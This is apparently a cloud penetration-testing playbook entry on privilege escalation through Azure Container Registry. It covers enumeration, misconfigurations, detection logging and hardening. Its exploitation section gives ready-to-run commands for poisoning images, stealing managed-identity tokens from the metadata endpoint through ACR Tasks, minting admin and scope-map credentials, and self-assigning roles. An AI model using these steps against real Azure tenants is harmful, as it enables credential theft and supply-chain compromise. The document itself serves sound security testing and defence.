---
cstg_id: CSTG-AZURE-CONTAINER-REGISTRY-PRIVESC
title: "AZURE Container Registry - Privilege Escalation"
provider: azure
service: container-registry
phase: privilege-escalation
required_access: assumed-breach
required_permissions:
  - Microsoft.ContainerRegistry/registries/push/write
  - Microsoft.ContainerRegistry/registries/scheduleRun/action
  - Microsoft.ContainerRegistry/registries/tasks/write
  - Microsoft.ContainerRegistry/registries/tasks/listDetails/action
  - Microsoft.ContainerRegistry/registries/listCredentials/action
  - Microsoft.ContainerRegistry/registries/generateCredentials/action
  - Microsoft.ContainerRegistry/registries/tokens/write
  - Microsoft.Authorization/roleAssignments/write
references:
  - https://learn.microsoft.com/en-us/azure/container-registry/container-registry-roles
  - https://learn.microsoft.com/en-us/azure/container-registry/container-registry-tasks-overview
  - https://learn.microsoft.com/en-us/azure/container-registry/container-registry-tasks-authentication-managed-identity
  - https://learn.microsoft.com/en-us/azure/aks/cluster-container-registry-integration
  - https://learn.microsoft.com/en-us/azure/container-registry/container-registry-repository-scoped-permissions
  - https://hackingthe.cloud/azure/
  - https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles
license: CC BY-SA 4.0
---

## Summary

Privilege escalation involving Azure Container Registry (ACR) follows three broad
paths:

1. **Image poisoning / supply-chain.** Push a modified or backdoored image to a
   tag that privileged consumers (AKS, ACI, App Service, Functions, ACR Tasks)
   subsequently pull and run, inheriting the consumer's identity and permissions.
2. **ACR Tasks identity abuse.** Run or define an ACR Task that executes with a
   managed identity attached to the registry, using that identity's Azure RBAC to
   act on other resources, read Key Vault secrets, or assign roles.
3. **Credential and token abuse.** Use control-plane permissions to mint admin
   credentials or scope-map tokens that grant broad, long-lived data-plane access,
   or use registry RBAC write to grant push/pull to a controlled principal.

The escalation is rarely "within" the registry resource itself; rather, the
registry is the pivot. Because container images run with the privileges of
whatever runs them, write access to an image effectively grants control of the
runtime identity of every consumer of that image. This is the core trust
relationship to exploit and to defend.

## Prerequisites

- An established foothold (assumed breach) as an Entra ID principal or a workload
  with one or more of: `AcrPush`, `Contributor`/`Owner` on the registry,
  `Microsoft.ContainerRegistry/.../scheduleRun/action`, task write, credential
  listing/generation, token write, or `Microsoft.Authorization/roleAssignments/write`
  scoped to the registry.
- Knowledge of registry consumers and their identities (gathered during
  [enumeration](../02-services/azure-container-registry-enum.md)) — which images
  AKS/ACI/App Service pull, and what managed identities are attached to the
  registry and its tasks.

## Enumeration

Before escalating, confirm the consumers and identities that make a path viable:

```bash
# Identities attached to the registry (targets for ACR Tasks abuse)
az acr show -n <registry> --query identity -o json

# Tasks and the identities they run as
az acr task list -r <registry> -o json \
  --query "[].{name:name, identity:identity, ctx:step.contextPath}"

# Which images privileged consumers pull
kubectl get pods -A -o jsonpath='{range .items[*]}{.spec.containers[*].image}{"\n"}{end}'   # AKS
az webapp config container show -g <rg> -n <app>            # App Service
az container show -g <rg> -n <aci> --query "containers[].image"

# Registry RBAC and tokens we might be able to extend
az role assignment list --scope $(az acr show -n <registry> --query id -o tsv) -o table
az acr token list -r <registry> -o table
```

## Misconfigurations & Findings

- A privileged workload (e.g. AKS deployment with a powerful pod-managed identity,
  or a node pool with a node identity) pulls an image from a tag the attacker can
  push to (mutable tag, no digest pinning, no admission control).
- An ACR Task is configured with `--assign-identity` referencing a user-assigned
  managed identity that holds `Contributor`, `User Access Administrator`, Key Vault
  access, or other high-value Azure RBAC.
- The principal can call `listCredentials`/`generateCredentials` to obtain
  long-lived admin or token credentials usable from anywhere.
- The principal holds `roleAssignments/write` at the registry scope and can grant
  itself or a sock-puppet `AcrPush`/`Owner`.
- Tags are not immutable and there is no content trust / no signature verification
  at the consumer.

## Exploitation

### AcrPush (image poisoning of a privileged consumer)

With push rights to a repository whose tag is consumed by a privileged runtime,
overwrite the tag with a backdoored image. The next pull-and-run executes
attacker code under the consumer's identity (e.g. an AKS pod's workload identity
or the node's kubelet identity, which can call IMDS for tokens).

```bash
az acr login -n <registry>
# Rebuild from the legitimate base, inject payload, retag to the consumed tag
docker pull <registry>.azurecr.io/<repo>:<tag>
# ... add malicious ENTRYPOINT/layer ...
docker tag  evil:latest <registry>.azurecr.io/<repo>:<tag>
docker push <registry>.azurecr.io/<repo>:<tag>
```

Once running, the payload typically targets the runtime identity, for example
querying the instance metadata endpoint from inside an AKS pod/node:

```bash
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Mutable tags make this trivial; pin-by-digest and admission control defeat it.

### scheduleRun / tasks write (ACR Tasks managed-identity abuse)

ACR Tasks run container builds inside the ACR service. A task can be assigned a
managed identity; any command in the task then executes with that identity's
Azure RBAC. If the registry/task identity is privileged, a quick task (no source
repo needed) can mint tokens and act on Azure.

```bash
# One-off task that uses the registry's managed identity to grab an ARM token
az acr run -r <registry> --cmd \
  '$ curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/"' \
  /dev/null
```

Or define a persistent task bound to a user-assigned identity, then trigger it:

```bash
az acr task create -r <registry> -n exfil \
  --assign-identity <userAssignedIdentityResourceId> \
  --cmd 'mcr.microsoft.com/azure-cli az account get-access-token' \
  --context /dev/null
az acr task run -r <registry> -n exfil
az acr task logs -r <registry> -n exfil    # read the captured token/output
```

The acquired token can then be used against ARM, Key Vault
(`https://vault.azure.net`), Storage, or Microsoft Graph depending on the
identity's role assignments — escalating from registry control to tenant/Azure
control.

### listCredentials / generateCredentials (long-lived credential minting)

If the admin user is enabled (or can be enabled with Contributor), list the
static admin credentials for durable push/pull from anywhere:

```bash
az acr update -n <registry> --admin-enabled true     # requires Contributor
az acr credential show -n <registry> -o json          # username + 2 passwords
```

For scope-map tokens, generate credentials (passwords) for an existing token:

```bash
az acr token credential generate -r <registry> -n <token> --password1 \
  --expiration-in-days 365 -o json
```

These credentials are identity-detached and survive most account-level
remediation, providing both escalation (broad data-plane rights) and persistence.

### tokens/write + scope maps (mint over-scoped data-plane access)

With token/scope-map write, create a scope map granting full content actions on
all repositories and a token bound to it:

```bash
az acr scope-map create -r <registry> -n allpower \
  --repository '*' content/read content/write content/delete metadata/read metadata/write
az acr token create -r <registry> -n pivot --scope-map allpower
# returns username + generated password for immediate docker login
```

This yields full push/delete across every repository — enabling image poisoning
of any consumer and durable access.

### roleAssignments/write (self-granted RBAC)

If the principal can write role assignments at the registry scope, assign itself
(or a controlled service principal) a powerful data role:

```bash
az role assignment create \
  --assignee <objectId> \
  --role AcrPush \
  --scope $(az acr show -n <registry> --query id -o tsv)
# or Owner for full control including credential and identity management
```

`Owner`/`User Access Administrator` at this scope additionally allows attaching a
managed identity to the registry/tasks and assigning that identity broad rights,
chaining into the ACR Tasks path above.

## Detection & Logging

- **Azure Activity Logs:** `registries/listCredentials/action`,
  `registries/generateCredentials/action`, `registries/update/write` (admin-user
  toggles), `registries/tasks/write`, `registries/scheduleRun/action`,
  `registries/tokens/write`, `registries/scopeMaps/write`, and
  `Microsoft.Authorization/roleAssignments/write` at a registry scope.
- **ACR diagnostic logs** (`ContainerRegistryRepositoryEvents`): unexpected
  `push`/`delete` events, pushes to production tags from unusual identities or
  IPs, and ACR Task runs.
- **Entra ID audit/sign-in logs:** token issuance to the registry's/task's
  managed identity, and new role assignments on registry-scoped resources.
- **Runtime/AKS signals:** unexpected outbound calls to `169.254.169.254` from
  pods, new images on workloads, and pulls of newly pushed digests.

Correlate a `tasks/write` or `scheduleRun` immediately followed by a managed
identity token issuance, and any `listCredentials` followed by data-plane logins
from new source IPs.

## Remediation & Hardening

- Disable the admin user and forbid enabling it via Azure Policy.
- Enforce immutable tags and consumer-side digest pinning; deploy admission
  control (e.g. image signature/attestation verification) so poisoned images are
  rejected.
- Do not attach high-privilege managed identities to registries or ACR Tasks;
  scope task identities to the minimum needed and prefer dedicated, least-privilege
  identities.
- Restrict `listCredentials`/`generateCredentials`, task write, and `scheduleRun`
  to a small set of pipeline principals.
- Restrict `roleAssignments/write` at registry scope; review registry RBAC
  regularly and avoid `Owner`/`Contributor` for routine push.
- Use scope-map tokens with narrow repositories and short expiries; alert on new
  scope maps/tokens.
- Send ACR diagnostic logs to a monitored workspace and alert on credential
  listing, task creation/runs, and pushes to protected tags.

## Tools

- Azure CLI (`az acr`, `az role assignment`) — task, token, credential, and RBAC operations.
- Azure REST / ARM API — scripted control-plane abuse.
- Docker / OCI clients, `crane`, `skopeo` — image rebuild and push.
- IMDS / token endpoints — managed-identity token retrieval from task or workload runtime.

## References

- ACR roles and permissions — https://learn.microsoft.com/en-us/azure/container-registry/container-registry-roles
- ACR Tasks overview — https://learn.microsoft.com/en-us/azure/container-registry/container-registry-tasks-overview
- ACR Tasks managed identity — https://learn.microsoft.com/en-us/azure/container-registry/container-registry-tasks-authentication-managed-identity
- AKS-ACR integration — https://learn.microsoft.com/en-us/azure/aks/cluster-container-registry-integration
- Repository-scoped permissions (scope maps/tokens) — https://learn.microsoft.com/en-us/azure/container-registry/container-registry-repository-scoped-permissions
- Azure built-in roles — https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles
- hackingthe.cloud (Azure) — https://hackingthe.cloud/azure/

See also: [Container Registry - Enumeration](../02-services/azure-container-registry-enum.md) and [Container Registry - Persistence](../06-persistence/azure-container-registry-persistence.md).
